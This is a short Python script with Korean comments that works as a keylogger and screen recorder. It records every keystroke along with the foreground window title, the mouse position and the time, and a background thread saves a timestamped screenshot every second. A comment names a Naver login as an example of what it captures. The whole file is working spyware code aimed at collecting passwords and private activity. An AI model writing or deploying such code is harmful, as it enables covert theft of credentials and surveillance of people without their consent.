from pynput import keyboard #키보드 로깅용 모듈
from datetime import datetime #날짜 시간 함수
import threading #쓰레드 모듈
#키보드 마우스 매크로 제어 모듈
import pyautogui
#슬랩 함수 위한 모듈
import time
#
import pygetwindow

#화면의 x,y좌표를 구하고 스크린샷을 찍음
def getMouse():
    while True:
        #마우스 좌표를 출력(무한 반복)
        print(pyautogui.position())
        #화면을 캡쳐하여 날짜이름으로 캡쳐파일 생성
        pyautogui.screenshot(str(datetime.now()).replace(":","_") + ".png")
        time.sleep(1)

def on_press(key):
    #키보드를 쳤을떄 발생함 키보드를 쳤을때 키로깅
    #pygetwindow.getActiveWindow().title 포그라운드로 프로세스 탐지하여 키를 눌렀을 떄
    #적용 및 반응하는 프로세스 탐지 ex) 네이버 : 로그인 point(~~) 2023.6.8.14:30 ~~으로 출력됨
    print(pygetwindow.getActiveWindow().title, pyautogui.position(), datetime.now(),key)

#getMouse 함수를 새로운 쓰레드로 생성하여 시작
mouse_thread = threading.Thread(target=getMouse, args=())
mouse_thread.start() 

with keyboard.Listener(on_press=on_press, on_release=None) as listener:
    listener.join()
print(1111)
